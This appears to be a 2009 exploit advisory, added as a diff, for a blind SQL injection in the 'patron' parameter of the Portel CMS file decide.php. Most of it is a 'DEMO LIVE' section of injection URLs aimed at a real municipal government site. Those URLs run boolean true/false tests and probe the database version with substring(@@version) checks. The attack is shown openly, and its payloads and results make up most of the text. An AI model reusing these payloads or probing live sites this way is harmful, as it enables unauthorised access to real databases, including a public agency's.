@@ -1,0 +1,50 @@
+------------------------------------------------------------------------------
+Portel (patron) Blind SQL-injection Vulnerability
+------------------------------------------------------------------------------
+
+
+ #####################################################
+ # [+] Author        :  Chip D3 Bi0s                 #
+ # [+] Email         :  chipdebios[alt+64]gmail.com  #
+ # [+] Vulnerability :  Blind SQL injection          #
+ # [+] Group         :  LatinHackTeam                #
+ #####################################################
+
+**********************************************************************
+ Info Cms:
+ * Name      : Portel
+ * Web       : http://www.porteleditor.com
+ * dowloand  : http://www.porteleditor.com/instalacion/portelv2008.zip
+               http://rapidshare.com/files/263383411/portelv2008.zip.html
+ * Country   : Colombia
+               
+**********************************************************************
+
+
+Example:
+http://localHost/path/libreria/php/decide.php?patron=n<Blind Sql Code>
+n = patron valid
+
+
+DEMO LIVE:
+
+http://www.bogota.gov.co/portel/libreria/php/decide.php?patron=01.'+and+1=1/*
+true
+
+http://www.bogota.gov.co/portel/libreria/php/decide.php?patron=01.'+and+1=2/*
+else
+
+http://www.bogota.gov.co/portel/libreria/php/decide.php?patron=01.'+and+substring(@@version,1,1)=4/*
+else
+
+http://www.bogota.gov.co/portel/libreria/php/decide.php?patron=01.'+and+substring(@@version,1,1)=5/*
+true
+
+
+etc, etc....
+
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
+# milw0rm.com [2009-08-05]
